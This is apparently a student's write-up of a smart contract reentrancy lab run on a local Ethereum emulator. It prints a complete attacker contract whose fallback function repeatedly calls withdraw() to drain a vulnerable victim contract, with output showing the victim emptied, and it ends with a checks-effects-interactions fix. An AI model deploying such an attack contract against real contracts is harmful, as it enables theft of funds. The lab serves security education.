# Smart Contract Reentrancy Attack Lab

## Lab Setup
- use emulator `Labsetup/emulator/output-small`
- install `web3` module for Python `$ pip3 install web3==5.31.1`

## Task 1: Getting Familiar with the Victim Smart Contract
- `ReentrancyVictim.sol`
    - it maintains the `balances` (`mapping (address => uint)`) of each address that deposit ether in it
    - users can deposit or withdraw ether
    - the vulnerability is that in the `withdraw()` function, it invokes `msg.sender.call{value: _amount}("")` first, then deduct `balances[msg.sender]`, a reentrancy attack can be launched here
### Task 1.a: Compiling the Contract
- in the newer version of Solidity, countermeasures are implemented. Therefore, compile the code using Version 0.6.8, which is an older version. The compiler `solc-0.6.8`
    - `$ solc-0.6.8 --overwrite --abi --bin -o . ReentrancyVictim.sol`
- 2 files is generated
    - `ReentrancyVictim.bin`: the bytecode of the contract, will be stored to the blockchain after the contract is deployed
    - `ReentrancyVictim.abi`: ABI stands for Application Binary Interface, the `abi` file contains the API information of the contract, it is needed when we need to interact with a contract, so we know the name of the functions, their parameters and return values
### Task 1.b: Deploying the Victim Contract
- `deploy_victim_contract.py`
    ```
    abi_file = "../contract/ReentrancyVictim.abi"
    bin_file = "../contract/ReentrancyVictim.bin"

    web3 = SEEDWeb3.connect_to_geth_poa('http://10.150.0.71:8545')

    # Unlock the account, and deploy the smart contract
    sender_account = web3.eth.accounts[1]
    web3.geth.personal.unlockAccount(sender_account, "admin")
    addr = SEEDWeb3.deploy_contract(web3, sender_account, abi_file, bin_file, None)

    print("Victim contract: {}".format(addr))
    with open("contract_address_victim.txt", "w") as fd:
        fd.write(addr)
    ```
    - the actual code that deploy the contract is in `SEEDWeb3.py`
        ```
        contract = web3.eth.contract(abi=abi, bytecode=bytecode)
        contract.constructor(...).transact({'from': sender_account})
        ```
- deploy
    ```
    $ ./deploy_victim_contract.py 
    Sending tx ...
    ---------Deploying Contract ----------------
    ... Waiting for block
    Transaction Hash: 0xfc74c28ab1e52b998e77748bde5339eda95f4a8a0b21ef81d2688e16062d0c91
    Transaction Receipt: ...
    Victim contract: 0xaf98236bcb084ADc949f43d647eb4045260b31F3
    ```
### Task 1.c: Interacting with the Victim Contract
- deposit money to this contract using `fund_victim_contract.py`
    ```
    abi_file    = '../contract/ReentrancyVictim.abi'
    victim_addr = '0xaf98236bcb084ADc949f43d647eb4045260b31F3'
    amount      = 10 # unit: ether
    ...
    ```
- run the code
    ```
    $ ./fund_victim_contract.py 
    Transaction sent, waiting for the block ...
    Transaction Receipt: ...
    ----------------------------------------------------------
    == My balance inside the contract:
    0xA403f63AD02a557D5DDCBD5F5af9A7627C591034: 10000000000000000000
    == Smart Contract total balance:
    0xaf98236bcb084ADc949f43d647eb4045260b31F3: 10000000000000000000
    ----------------------------------------------------------
    ```

- run the code again to deposit another `20 ETH`, and run `withdraw_from_victim_contract.py` to withdraw `5 ETH`
    ```
    == My balance inside the contract:
    0xA403f63AD02a557D5DDCBD5F5af9A7627C591034: 30000000000000000000
    == Smart Contract total balance:
    0xaf98236bcb084ADc949f43d647eb4045260b31F3: 30000000000000000000
    ```
    ```
    == My balance inside the contract:
    0xA403f63AD02a557D5DDCBD5F5af9A7627C591034: 25000000000000000000
    == Smart Contract total balance:
    0xaf98236bcb084ADc949f43d647eb4045260b31F3: 25000000000000000000
    ```

## Task 2: The Attacking Contract
- the attack contract `ReentrancyAttacker.sol`
    ```
    //SPDX-License-Identifier: MIT
    pragma solidity ^0.6.8
    import "./ReentrancyVictim.sol";

    contract ReentrancyAttacker {
        ReentrancyVictim public victim;
        address payable _owner;

        constructor(address payable _addr) public {
            victim = ReentrancyVictim(_addr);
            _owner = payable(msg.sender);
        }

        fallback() external payable {
            if(address(victim).balance >= 1 ether) {
                victim.withdraw(1 ether);
            }
        }

        function attack() external payable {
            require(msg.value >= 1 ether, "You need to send one ether when attacking");

            victim.deposit{value: 1 ether}();
            victim.withdraw(1 ether);
        }
    }
    ```
    - When invoking withdraw() in victim, the victim send ether to attacker, and invokes attacker's fallback(), as long as the balance of the victim is not less than 1 ether, the fallback() function will invoke withdraw() repeatedly
    - the invocation chain: withdraw() --> fallback() --> withdraw() --> fallback() --> ...
- deploy attacker contract, we need to modify `deploy_attack_contract.py` to pass the address of the victim contract to the attacker contract
    ```
    $ ./deploy_attack_contract.py 
    ---------Deploying Contract ----------------
    ... Waiting for block
    Transaction Hash: 0xda16d5f650e0d1c87fd70572e584673d66d0ee1f4ead86247cb5354e5760bd9a
    Transaction Receipt: ...
    Attack contract: 0x758a1930B1a2350F446f81f39E4D2E8e010227A2
    ```

## Task 3: Launching the Reentrancy Attack
- all we need to do is to invoke the `attack()` function in the attack contract, and send the attack contract more at least `1 ETH`
- one thing important is that in this emulator, there is no gas fee, if there is, we need to send more than `1 ETH` to the attack contract to ensure that there is sufficient gas for the attack
- result
    ```
    $ ./launch_attack.py 
    Transaction sent, waiting for block ...
    Transaction Receipt: ...
    $ ./get_balance.py 
    ----------------------------------------------------------
    *** This client program connects to 10.151.0.71:8545
    *** The following are the accounts on this Ethereum node
    0x8c400205fDb103431F6aC7409655ad3cf8f6d007: 32000314325000000000
    0x9105A373ce1d01B517aA54205A5E4c70FA9f34Fe: 5499999999999999999998999360248995521743
    ----------------------------------------------------------
    Victim: 0xaf98236bcb084ADc949f43d647eb4045260b31F3: 0
    Attacker: 0x758a1930B1a2350F446f81f39E4D2E8e010227A2: 26000000000000000000
    ```
    - the attack contract withdraw all money from the victim contract
- cashout (withdraw money from attack contract to `eth.accounts[0]` on node `10.151.0.71`)
    - check the balance before cashout
    ```
    > eth.getBalance(eth.accounts[0])
    32000314325000000000
    ```
    - cashout
    ```
    $ ./cashout.py 
    Transaction sent, waiting for block ...
    Transaction Receipt: ...
    ```
    - check balance again
    ```
    > eth.getBalance(eth.accounts[0])
    58000314325000000000
    ```

## Task 4: Countermeasures
- there are a number of common techniques to avoid potential reentracy vulnerabilities in smart contracts
- one approach is to ensure that all logic that changes state variables happens before ether is sent out of the contract (or any external call). It's a good practice for any code that performs external calls to unknown addresses to be the last operation in a localized function or piece of code execution, this is known as the *checks-effects-interactions* pattern
- fix `ReentrancyVictim.sol`
    ```
    function withdraw(uint _amount) public {
        // Modify state variables
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] -= _amount;
        total_amount -= _amount;

        // Send ether
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether!");
    }
    ```
- besides, newer versions have built-in protection against the reentrancy attack. However, not enough details are given in the documentation, here is a discussion found from [the Ethereum GitHub repository](https://github.com/ethereum/solidity/issues/12996)
